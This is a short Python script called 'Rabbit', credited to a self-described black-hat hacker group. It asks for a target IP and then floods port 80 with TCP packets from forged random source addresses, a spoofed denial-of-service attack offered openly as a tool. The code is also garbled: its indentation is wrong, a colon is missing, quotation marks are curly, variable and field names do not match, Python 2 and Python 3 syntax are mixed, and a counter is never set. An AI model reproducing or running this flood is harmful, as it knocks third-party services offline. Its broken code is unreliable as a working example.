#!/usr/bin/python 

from scapy.all import*
import random	
	
print ('''
\033[1;31;40m
       ____       _     _     _ _
      |  _ \ __ _| |__ | |__ (_) |_
      | |_) / _` | '_ \| '_ \| | __|
      |  _ < (_| | |_) | |_) | | |_
      |_| \_\__,_|_.__/|_.__/|_|\__|	     


  ''')
print ("\033[1;32;40m by Mohamed Aly Sidi Mohamed")
print ("\033[1;33;40m Black Hat Dragon")
print ("\033[1;34;40m Mauritanian Hackers Organization")

target_IP = input("\033[1;31;40mEnter IP of Target: ")



 while True:
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = “.”
   Source_ip = a + dot + b + dot + c + dot + d
 
   for source_port in range(1, 65535)
      IP1 = IP(source_IP = source_IP, destination = target_IP)
      TCP1 = TCP(srcport = source_port, dstport = 80)
      pkt = IP1 / TCP1
      send(pkt,inter = .001)
   
      print "packet sent ", i
         i = i + 1
